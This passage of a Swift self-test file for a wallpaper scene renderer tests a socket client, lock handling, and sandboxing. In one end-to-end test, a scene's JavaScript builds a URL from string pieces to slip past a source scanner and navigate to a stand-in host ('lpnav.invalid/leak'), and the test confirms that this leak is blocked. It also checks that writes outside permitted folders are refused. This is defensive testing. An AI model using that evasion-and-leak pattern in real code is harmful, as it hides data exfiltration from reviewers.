        let dir = URL(fileURLWithPath: "/tmp/lp-st-\(getpid())-rt")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let socket = dir.appendingPathComponent("render.sock")
        let client = RenderClient(socket: socket)
        client.allowSpawn = false
        // Nothing listens and spawning is off: a clear error, no process started.
        do { _ = try client.sendBlocking(RenderRequest(op: .still, html: "/x.html"), timeout: 2); throw TestFailure(description: "expected failure") }
        catch let e as RenderClientError { try expect(e.localizedDescription.contains("nothing is listening"), e.localizedDescription) }
        _ = try serve(socket, count: 3) { line in   // isServerRunning's probe uses one connection
            let req = try? JSONDecoder().decode(RenderRequest.self, from: line)
            if req?.op == .bench { return Data("garbage".utf8) }
            return Data(#"{"ok":true,"ready":true,"errors":["e1"],"bench_ms":1.5,"mean_luma":12.5,"clock_luma":3,"note":"\#(req?.op.rawValue ?? "?")"}"#.utf8)
        }
        try expect(client.isServerRunning(), "listening")
        let r = try client.sendBlocking(RenderRequest(op: .ping), timeout: 5)
        try expect(r.ok && r.ready && r.note == "ping" && r.errors == ["e1"] && r.benchMs == 1.5 && r.meanLuma == 12.5 && r.clockLuma == 3, "decoded")
        do { _ = try client.sendBlocking(RenderRequest(op: .bench), timeout: 5); throw TestFailure(description: "expected bad response") }
        catch RenderClientError.badResponse(let s) { try expectEqual(s, "garbage") }
        // Socket paths that don't fit sockaddr_un are rejected up front.
        let long = RenderClient(socket: URL(fileURLWithPath: "/tmp/" + String(repeating: "x", count: 120) + "/render.sock"))
        long.allowSpawn = false
        do { _ = try long.sendBlocking(RenderRequest(op: .ping), timeout: 1); throw TestFailure(description: "expected path error") }
        catch let e as RenderClientError { try expect(e.localizedDescription.contains("too long"), e.localizedDescription) }
    }

    /// The focus rule: when another process holds the server lock (a server is starting or taking
    /// over), a client must wait for it instead of launching a daemon of its own.
    static func clientWaitsForLockHolder() throws {
        let dir = URL(fileURLWithPath: "/tmp/lp-st-\(getpid())-lk")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let files = RenderServiceFiles(socket: dir.appendingPathComponent("render.sock"))
        try expect(!files.isServerLockHeld(), "free at first")
        let fd = open(files.serverLock.path, O_CREAT | O_RDWR, 0o600)
        defer { close(fd) }
        try expect(flock(fd, LOCK_EX | LOCK_NB) == 0, "took the lock")
        try expect(files.isServerLockHeld(), "held")
        // The "server" starts listening a little later; the client must connect to it.
        let socket = files.socket
        DispatchQueue.global().asyncAfter(deadline: .now() + 0.5) {
            // The client's "is it listening yet?" probe takes one connection, the request the other.
            _ = try? serve(socket, count: 2) { _ in Data(#"{"ok":true,"ready":true,"errors":[],"note":"late"}"#.utf8) }
        }
        setenv("LIVEPAPER_RENDERD", "/usr/bin/false", 1) // if the client wrongly launched something, it would be this
        defer { unsetenv("LIVEPAPER_RENDERD") }
        let r = try RenderClient(socket: socket).sendBlocking(RenderRequest(op: .still, html: "/x.html"), timeout: 10)
        try expectEqual(r.note, "late")
    }

    // MARK: - End to end (opt-in: starts one LivePaperRenderd)

    static func endToEnd() throws {
        let env = ProcessInfo.processInfo.environment
        guard env["LIVEPAPER_SELFTEST_E2E"] == "1" else {
            print("  (skipped: set LIVEPAPER_SELFTEST_E2E=1 to run it; it starts one LivePaperRenderd)")
            return
        }
        let ownHome = env["LIVEPAPER_HOME"]?.isEmpty ?? true
        let home = ownHome ? URL(fileURLWithPath: "/tmp/lp-st-\(getpid())-e2e") : LPPaths.supportRoot
        let socket = home.appendingPathComponent("render.sock")
        let client = RenderClient(socket: socket)
        defer {
            if ownHome {
                _ = try? client.sendBlocking(RenderRequest(op: .shutdown), timeout: 10)
                try? FileManager.default.removeItem(at: home)
            }
        }
        let template = SceneCompiler.defaultRuntimeDir.appendingPathComponent("templates/web")
        let pkg = try tempDir("e2e").appendingPathComponent("aurora.lpscene")
        defer { try? FileManager.default.removeItem(at: pkg.deletingLastPathComponent()) }
        try FileManager.default.copyItem(at: template, to: pkg)

        let report = try blocking { try await SceneChecker(render: client).check(package: pkg, options: CheckOptions(power: true)) }
        try expect(report.passed, "template must pass: \(report.problems)")
        try expect(report.jsErrors.isEmpty, "\(report.jsErrors)")
        try expectEqual(report.stills.count, 13)
        for s in report.stills {
            let data = try Data(contentsOf: URL(fileURLWithPath: s.path))
            try expect(data.starts(with: [0x89, 0x50, 0x4E, 0x47]), "PNG \(s.path)")
            try expect((s.meanLuma ?? 0) > 5 && (s.clockLuma ?? 999) < 60, "luma \(s.meanLuma ?? -1)/\(s.clockLuma ?? -1)")
        }
        try expect((SceneChecker.headlineBenchMs(report) ?? 99) < CheckBudgets().benchMs, "bench \(report.benchMs)")
        try expect((report.energyMw ?? 999) < CheckBudgets().energyWarnMw, "energy \(report.energyMw ?? -1)")
        let manifest = try SceneManifest.load(package: pkg)
        try expect(manifest.performance?.benchMs != nil, "performance recorded")

        let thumb = pkg.appendingPathComponent("thumbnail.jpg")
        let t = try client.sendBlocking(RenderRequest(op: .thumbnail, scene: pkg.path, out: thumb.path), timeout: 60)
        try expect(t.ok, t.note ?? "thumbnail failed")
        let jpeg = try Data(contentsOf: thumb)
        try expect(jpeg.starts(with: [0xFF, 0xD8]), "JPEG")

        // The server refuses to write outside the request's package / workspaces / temp folders.
        // (Failures are collected so one run reports every one of them.)
        var failures: [String] = []
        func check(_ ok: Bool, _ message: @autoclosure () -> String) { if !ok { failures.append(message()) } }
        let fm = FileManager.default
        let outside = fm.homeDirectoryForCurrentUser.appendingPathComponent("Library/Caches/LivePaperSelfTest-\(UUID().uuidString.prefix(8))")
        try fm.createDirectory(at: outside, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: outside) }
        let victim = outside.appendingPathComponent("victim.png")
        try Data("not an image".utf8).write(to: victim)
        let html = pkg.appendingPathComponent(".check/scene.html").path
        for (request, what) in [(RenderRequest(op: .still, html: html, width: 320, height: 200, dpr: 1, t: 1, out: victim.path), "still outside"),
                                (RenderRequest(op: .still, html: html, width: 320, height: 200, dpr: 1, t: 1,
                                               out: pkg.appendingPathComponent(".check/notes.docx").path), "not a PNG"),
                                (RenderRequest(op: .thumbnail, scene: pkg.path, out: outside.appendingPathComponent("thumbnail.jpg").path), "thumbnail outside")] {
            let r = try client.sendBlocking(request, timeout: 60)
            print("  \(what): ok=\(r.ok) note=\(r.note ?? "-")")
            check(!r.ok && (r.note ?? "").contains("refusing to write"), "\(what): \(r.ok) \(r.note ?? "")")
        }
        check((try? String(contentsOf: victim, encoding: .utf8)) == "not an image", "victim overwritten")
        check((try? fm.contentsOfDirectory(atPath: outside.path)) == ["victim.png"], "files written outside: \((try? fm.contentsOfDirectory(atPath: outside.path)) ?? [])")

        // A scene that navigates away (a URL the source scanner can't see) is stopped, not loaded.
        let nav = try package("navigates", js: """
        LivePaper.scene({
          setup(lp) { location.href = 'https:' + '/' + '/lpnav.invalid/leak?d=' + lp.w; },
          draw(lp) { lp.ctx.fillStyle = '#102040'; lp.ctx.fillRect(0, 0, lp.w, lp.h); }
        });
        """)
        defer { try? fm.removeItem(at: nav.deletingLastPathComponent()) }
        let navHTML = nav.appendingPathComponent(".check/scene.html")
        try SceneCompiler().compile(package: nav, to: navHTML)
        let n = try client.sendBlocking(RenderRequest(op: .still, html: navHTML.path, width: 320, height: 200, dpr: 1, t: 1,
                                                      out: nav.appendingPathComponent(".check/still.png").path), timeout: 60)
        print("  navigating still: ok=\(n.ok) note=\(n.note ?? "-") errors=\(n.errors)")
        let blocked = (n.note ?? "").contains("tried to navigate") || n.errors.contains { $0.contains("tried to navigate") }
        check(blocked && !(n.note ?? "").contains("hostname"), "navigation: ok=\(n.ok) note=\(n.note ?? "-") errors=\(n.errors)")
        let navCheck = try blocking { try await SceneChecker(render: client).check(package: nav, options: CheckOptions(quick: true)) }
        print("  navigating check: passed=\(navCheck.passed) jsErrors=\(navCheck.jsErrors)")
        check(!navCheck.passed && navCheck.jsErrors.contains { $0.contains("tried to navigate to https://lpnav.invalid/leak") },
              "check fails a navigating scene: \(navCheck.problems)")
        if !failures.isEmpty { throw TestFailure(description: failures.joined(separator: "\n    ")) }
    }
}
